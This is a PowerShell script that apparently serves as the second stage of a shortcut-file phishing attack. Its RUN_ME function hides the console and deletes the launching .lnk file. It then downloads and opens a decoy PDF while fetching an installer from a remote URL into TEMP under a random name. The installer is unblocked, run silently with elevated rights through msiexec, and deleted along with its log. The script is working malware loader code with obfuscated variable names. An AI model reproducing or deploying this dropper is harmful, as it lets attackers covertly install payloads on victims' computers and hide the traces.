# ── File Removal with Fallback ──────────────────────────
function Remove-FileWithFallback {
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$Path
    )

    if (-not [System.IO.File]::Exists($Path)) {
        return $false
    }

    try {
        [System.IO.File]::Delete($Path)
        return $true
    }
    catch {
        try {
            $directory = [System.IO.Path]::GetDirectoryName($Path)
            $name = [System.IO.Path]::GetFileNameWithoutExtension($Path)
            $extension = [System.IO.Path]::GetExtension($Path)
            $counter = 1

            while ($true) {
                $newPath = [System.IO.Path]::Combine(
                    $directory,
                    "$name($counter)$extension"
                )
                
                if (-not [System.IO.File]::Exists($newPath)) {
                    break
                }
                $counter++
            }

            [System.IO.File]::Move($Path, $newPath, $false)
            return $true
        }
        catch {
            return $false
        }
    }
}

# ── Web Content Download ──────────────────────────
# ── Web Content Download (FAST — BITS + Parallel HttpClient) ──────────
function Invoke-SecureDownload {
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$Uri,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$OutFile,

        [int]$MaxRetries = 3,
        [int]$RetryDelayMs = 800,
        [int]$ParallelChunks = 8
    )

    # Method 1: BITS (Background Intelligent Transfer Service) — fastest
    try {
        Import-Module BitsTransfer -ErrorAction Stop
        Start-BitsTransfer -Source $Uri -Destination $OutFile -TransferType Download `
            -Priority Foreground -ErrorAction Stop -Description "Downloading"
        if ([System.IO.File]::Exists($OutFile) -and (Get-Item $OutFile).Length -gt 0) {
            return $true
        }
    } catch { }

    # Method 2: Parallel chunked download with HttpClient (Range requests)
    $attempt = 0
    while ($attempt -lt $MaxRetries) {
        try {
            Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue

            # Probe for size and Range support
            $probeClient = New-Object System.Net.Http.HttpClient
            $probeClient.Timeout = [TimeSpan]::FromSeconds(30)
            $probeClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")
            $probeClient.DefaultRequestHeaders.Range = New-Object System.Net.Http.Headers.RangeHeaderValue(0, 0)

            $probeResp = $probeClient.SendAsync(
                (New-Object System.Net.Http.HttpRequestMessage("GET", $Uri)),
                [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead
            ).GetAwaiter().GetResult()

            $supportsRange = ($probeResp.StatusCode -eq [System.Net.HttpStatusCode]::PartialContent)
            $totalSize = $null
            if ($supportsRange -and $probeResp.Content.Headers.ContentRange) {
                $totalSize = $probeResp.Content.Headers.ContentRange.Length
            } elseif ($probeResp.Content.Headers.ContentLength) {
                $totalSize = $probeResp.Content.Headers.ContentLength
            }
            $probeResp.Dispose()
            $probeClient.Dispose()

            if ($supportsRange -and $totalSize -and $totalSize -gt 1MB) {
                # Chunked parallel download
                $chunkSize = [Math]::Ceiling($totalSize / $ParallelChunks)
                $tempFiles = @()
                $jobs = @()

                for ($i = 0; $i -lt $ParallelChunks; $i++) {
                    $start = [long]($i * $chunkSize)
                    if ($start -ge $totalSize) { break }
                    $end = [long][Math]::Min($start + $chunkSize - 1, $totalSize - 1)

                    $partPath = "$OutFile.part$i"
                    $tempFiles += $partPath
                    $startByte = $start
                    $endByte = $end
                    $uriCopy = $Uri
                    $partCopy = $partPath

                    $jobs += Start-Job -ScriptBlock {
                        param($u, $s, $e, $p)
                        Add-Type -AssemblyName System.Net.Http
                        $c = New-Object System.Net.Http.HttpClient
                        $c.Timeout = [TimeSpan]::FromSeconds(300)
                        $c.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")
                        $c.DefaultRequestHeaders.Range = New-Object System.Net.Http.Headers.RangeHeaderValue($s, $e)

                        $resp = $c.GetAsync($u, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
                        $resp.EnsureSuccessStatusCode() | Out-Null
                        $inStream = $resp.Content.ReadAsStreamAsync().GetAwaiter().GetResult()
                        $outStream = [System.IO.File]::Create($p)
                        try {
                            $buf = New-Object byte[] (1MB)
                            while (($r = $inStream.Read($buf, 0, $buf.Length)) -gt 0) {
                                $outStream.Write($buf, 0, $r)
                            }
                        } finally {
                            $outStream.Close()
                            $inStream.Close()
                            $c.Dispose()
                        }
                    } -ArgumentList $uriCopy, $startByte, $endByte, $partCopy
                }

                $jobs | Wait-Job | Out-Null
                $jobs | Receive-Job | Out-Null
                $jobs | Remove-Job -Force

                # Merge chunks
                $mergeStream = [System.IO.File]::Create($OutFile)
                try {
                    foreach ($p in $tempFiles) {
                        $fs = [System.IO.File]::OpenRead($p)
                        try { $fs.CopyTo($mergeStream) } finally { $fs.Close() }
                        [System.IO.File]::Delete($p)
                    }
                } finally {
                    $mergeStream.Close()
                }
                return $true
            } else {
                # Single-stream HttpClient (still faster than WebRequest)
                $client = New-Object System.Net.Http.HttpClient
                $client.Timeout = [TimeSpan]::FromSeconds(120)
                $client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")

                $resp = $client.GetAsync($Uri, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
                $resp.EnsureSuccessStatusCode() | Out-Null
                $inStream = $resp.Content.ReadAsStreamAsync().GetAwaiter().GetResult()
                $outStream = [System.IO.File]::Create($OutFile)
                try {
                    $buf = New-Object byte[] (1MB)
                    while (($r = $inStream.Read($buf, 0, $buf.Length)) -gt 0) {
                        $outStream.Write($buf, 0, $r)
                    }
                } finally {
                    $outStream.Close()
                    $inStream.Close()
                    $client.Dispose()
                }
                return $true
            }
        }
        catch {
            $attempt++
            if ($attempt -lt $MaxRetries) {
                Start-Sleep -Milliseconds $RetryDelayMs
            }
        }
    }

    # Fallback to WebClient
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($Uri, $OutFile)
        return $true
    } catch { return $false }
}

# ── Hide Console Window ──────────────────────────
function Hide-ConsoleWindow {
    try {
        $ConsoleWin = [Console.Window]::GetConsoleWindow()
        if ($ConsoleWin -ne [IntPtr]::Zero) {
            [Console.Window]::ShowWindow($ConsoleWin, 0) | Out-Null
        }
    }
    catch {
        
    }
}

# ── Primary Deployment Function ──────────────────────────
function RUN_ME {
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$FdpUR,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$GGInstaSllerUR
    )

    Hide-ConsoleWindow

    $CurrentDir = (Get-Location).Path
    $FpdPath = Join-Path $CurrentDir ($Name + ".pdf")
    $LnkPath = Join-Path $CurrentDir ($Name + ".lnk")

    Remove-FileWithFallback -Path $LnkPath | Out-Null
    Remove-FileWithFallback -Path $FpdPath | Out-Null

    if (Invoke-SecureDownload -Uri $FdpUR -OutFile $FpdPath) {
        try {
            Start-Process $FpdPath -ErrorAction SilentlyContinue
        }
        catch {
            
        }
    }

    $USSInstSSaller = [System.Uri]$GGInstaSllerUR
    $InstallerExt = [System.IO.Path]::GetExtension($USSInstSSaller.AbsolutePath)
    
    if ([string]::IsNullOrWhiteSpace($InstallerExt)) {
        $InstallerExt = ".exe"
    }

    $RandomFileName = [System.IO.Path]::GetRandomFileName()
    $RandomFileName = [System.IO.Path]::ChangeExtension($RandomFileName, $InstallerExt)
    $InstallerPath = [System.IO.Path]::Combine($env:TEMP, $RandomFileName)
    $InstallerLogPath = [System.IO.Path]::ChangeExtension($InstallerPath, "log")

    if (-not (Invoke-SecureDownload -Uri $GGInstaSllerUR -OutFile $InstallerPath)) {
        return $false
    }

    try {
        Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
    }
    catch {
        
    }

    $Arguments = "/i `"$InstallerPath`" /qn /norestart /l `"$InstallerLogPath`""

    try {
        $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Verb RunAs -Wait -PassThru
        $ExitCode = $Process.ExitCode
    }
    catch {
        return $false
    }

    Start-Sleep -Milliseconds 500
    Remove-FileWithFallback -Path $InstallerPath | Out-Null
    Remove-FileWithFallback -Path $InstallerLogPath | Out-Null

    return ($ExitCode -eq 0)
}



